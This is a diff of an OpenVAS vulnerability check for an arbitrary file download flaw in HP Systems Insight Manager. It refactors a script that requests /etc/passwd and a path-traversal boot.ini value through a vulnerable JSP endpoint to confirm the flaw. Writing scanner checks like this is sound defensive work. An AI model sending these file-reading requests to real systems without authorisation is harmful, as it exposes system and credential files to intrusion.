@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hp_sim_44098.nasl 14233 2019-03-16 13:32:43Z mmartin $
 #
 # HP Systems Insight Manager Arbitrary File Download Vulnerability
 #
@@ -27,8 +26,8 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100873");
-  script_version("$Revision: 14233 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
+  script_version("2019-05-13T14:05:09+0000");
+  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
   script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
   script_bugtraq_id(44098);
   script_tag(name:"cvss_base", value:"5.0");
@@ -48,53 +47,55 @@ if (description)
   script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 5000);
   script_exclude_keys("Settings/disable_cgi_scanning");
+
   script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
-information.");
+  information.");
+
   script_tag(name:"summary", value:"HP Systems Insight Manager is prone to a vulnerability that lets
-attackers download arbitrary files.
+  attackers download arbitrary files.");
 
-Exploiting this issue will allow an attacker to view arbitrary files
-within the context of the application. Information harvested may aid
-in launching further attacks.
+  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary files
+  within the context of the application. Information harvested may aid in launching further attacks.");
 
-The issue affects HP Systems Insight Manager versions 6.0 and 6.1.");
+  script_tag(name:"affected", value:"The issue affects HP Systems Insight Manager versions 6.0 and 6.1.");
+
   exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
-
 port = get_http_port(default:5000);
-if(!get_port_state(port))exit(0);
 
-soc = http_open_socket(port);
-if(!soc) exit(0);
-http_close_socket(soc);
+if(http_vuln_check(port:port, url:"/", pattern:"HP Systems Insight Manager", usecache:TRUE)) {
 
-files = make_array("root:.*:0:[01]:","/etc/passwd","\[boot loader\]","..\\..\\..\\..\\..\\..\\..\\boot.ini");
+  files = make_array("root:.*:0:[01]:", "/etc/passwd", "\[boot loader\]", "..\\..\\..\\..\\..\\..\\..\\boot.ini");
 
-if(http_vuln_check(port:port, url:"/", pattern:"HP Systems Insight Manager")) {
-
-  foreach file (keys(files)) {
+  foreach pattern(keys(files)) {
 
     soc = http_open_socket(port);
-    if(!soc)exit(0);
-    req = string("HEAD /mxportal/taskandjob/switchFWInstallStatus.jsp?logfile=",files[file]," HTTP/1.0\r\n\r\n");
+    if(!soc)
+      exit(0);
+
+    file = files[pattern];
+
+    url = "/mxportal/taskandjob/switchFWInstallStatus.jsp?logfile=" + file;
+    req = string("HEAD ", url, " HTTP/1.0\r\n\r\n");
     send(socket:soc, data: req);
     r = http_recv(socket:soc);
     http_close_socket(soc);
 
-    if(r == NULL)continue;
-    if(egrep(pattern:file, string:r)) {
+    if(!r)
+      continue;
 
-      security_message(port:port);
+    if(egrep(pattern:pattern, string:r)) {
+      report = report_vuln_url(port:port, url:url);
+      security_message(port:port, data:report);
       exit(0);
-
     }
   }
 }
 
 exit(0);
-
